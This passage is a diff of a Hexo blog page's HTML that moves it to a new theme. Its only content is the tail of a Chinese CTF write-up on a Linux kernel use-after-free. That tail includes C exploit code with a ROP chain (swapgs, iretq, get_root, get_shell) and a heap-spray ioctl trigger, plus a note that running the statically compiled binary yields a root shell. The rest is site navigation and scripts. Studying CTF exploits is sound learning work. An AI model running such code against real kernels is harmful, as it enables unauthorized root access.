(<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root,</span><br><span class="line">        swapgs, <span class="comment">// swapgs; pop rbp; ret</span></span><br><span class="line">        base,   <span class="comment">// rbp = base</span></span><br><span class="line">        iretq,</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell,</span><br><span class="line">        user_cs,</span><br><span class="line">        user_rflags,</span><br><span class="line">        base + <span class="number">0x10000</span>,</span><br><span class="line">        user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)lower_address, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Writing function pointer to the driver&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> len = write(fd2, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Triggering&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// FFFFFFFF814D8AED call rax</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>静态编译后放入文件目录中，运行即可获得root shell！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/4148.html">一道简单内核题入门内核利用</a><br><a target="_blank" rel="noopener" href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">NCSTISC Linux Kernel PWN450 Writeup</a></p>
 
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/08/15/Linux-Kernel-UAF/" data-id="ckhe7o4oj007rchl79ang4goi" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>
 
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Kernel/" rel="tag"># Kernel</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/08/08/%E5%AD%A6%E4%B9%A0Android%E4%B8%8A%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8Djemalloc/" rel="prev" title="学习Android上的内存分配jemalloc">
+      <i class="fa fa-chevron-left"></i> 学习Android上的内存分配jemalloc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/08/15/C-%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/" rel="next" title="C++模板与泛型编程">
+      C++模板与泛型编程 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">2.</span> <span class="nav-text">修改cred结构体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E5%85%B3%E9%97%ADSMEP"><span class="nav-number">3.</span> <span class="nav-text">ROP关闭SMEP</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Bruce Fan</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
     </footer>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2017/08/15/C-%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          C++模板与泛型编程
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2017/08/08/%E5%AD%A6%E4%B9%A0Android%E4%B8%8A%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8Djemalloc/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">学习Android上的内存分配jemalloc</div>
-    </a>
-  
-</nav>
 
   
-</article>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
+<script src="/js/utils.js"></script>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
-    </div>
-  </div>
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
 
 
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
-    </div>
-  </div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
-    </div>
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/06/User-namespace/">User namespace</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
 
   
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
 
   
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
 </body>
 </html>
